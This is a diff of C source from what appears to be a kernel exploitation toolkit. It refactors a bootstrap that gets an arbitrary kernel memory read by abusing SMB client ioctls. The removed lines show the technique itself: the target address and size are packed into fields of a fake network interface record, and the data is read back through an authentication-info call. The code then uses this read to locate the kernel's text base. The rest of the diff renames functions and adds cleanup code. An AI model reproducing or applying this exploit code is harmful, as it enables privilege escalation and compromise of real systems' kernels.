@@ -194,27 +194,13 @@ int kmem_boostrap_try_read(struct kmem_bootstrap* kmem, void* dst, uintptr_t src
     
     int fd = smb_dev_rw_get_dev_fd(dev->dev);
     
-    int error = smb_client_ioc_auth_info(fd, NULL, UINT32_MAX, NULL, UINT32_MAX, NULL);
+    int error = kmem_read_session_read(kmem->read_session, fd, dst, src, size);
     if (error == EINVAL) {
         dev->config = DEV_USABLE;
         kmem_read_session_destroy(&kmem->read_session);
         kmem->read_session = NULL;
         return error;
     }
-    xe_assert_err(error);
-    
-    struct network_nic_info nic_info;
-    bzero(&nic_info, sizeof(nic_info));
-    nic_info.nic_index = FAKE_SESSION_NIC_INDEX;
-    nic_info.nic_link_speed = ((uint64_t)size) << 32;
-    nic_info.nic_caps = (uint32_t)((uintptr_t)src);
-    nic_info.nic_type = (uint32_t)((uintptr_t)src >> 32);
-    memcpy(&nic_info.addr, &FAKE_SESSION_NIC_ADDR, sizeof(FAKE_SESSION_NIC_ADDR));
-    
-    error = smb_client_ioc_update_client_interface(fd, &nic_info, 1);
-    xe_assert_err(error);
-    
-    error = smb_client_ioc_auth_info(fd, dst, size, NULL, UINT32_MAX, NULL);
     xe_assert_err(error);
     return 0;
 }
@@ -248,7 +234,7 @@ static const struct xe_kmem_ops kmem_ro_ops = {
 };
 
 
-xe_kmem_backend_t kmem_boostrap_create(const struct sockaddr_in* smb_addr) {
+xe_kmem_backend_t kmem_bootstrap_create(const struct sockaddr_in* smb_addr) {
     smb_dev_rw_t devs[2] = { NULL, NULL };
     smb_dev_rw_create(smb_addr, &devs[0], &devs[1]);
     
@@ -275,7 +261,7 @@ xe_kmem_backend_t kmem_boostrap_create(const struct sockaddr_in* smb_addr) {
     return xe_kmem_backend_create(&kmem_ro_ops, kmem);
 }
 
-uintptr_t kmem_boostrap_get_mach_execute_header(xe_kmem_backend_t backend) {
+uintptr_t kmem_bootstrap_get_mach_execute_header(xe_kmem_backend_t backend) {
     struct kmem_bootstrap* kmem = (struct kmem_bootstrap*)xe_kmem_backend_get_ctx(backend);
     struct kmem_bootstrap_dev* dev = NULL;
     
@@ -303,7 +289,14 @@ uintptr_t kmem_boostrap_get_mach_execute_header(xe_kmem_backend_t backend) {
     return text_base;
 }
 
-void kem_boostrap_destroy(xe_kmem_backend_t* backend_p) {
-    xe_log_error("todo");
-    abort();
+void kmem_bootstrap_destroy(xe_kmem_backend_t* backend_p) {
+    struct kmem_bootstrap* kmem = xe_kmem_backend_get_ctx(*backend_p);
+    for (int i=0; i<kmem->num_devs; i++) {
+        smb_dev_rw_destroy(&kmem->devs[i].dev);
+    }
+    kmem_read_session_destroy(&kmem->read_session);
+    kmem_write_session_destroy(&kmem->write_session);
+    free(kmem->devs);
+    free(kmem);
+    xe_kmem_backend_destroy(backend_p);
 }
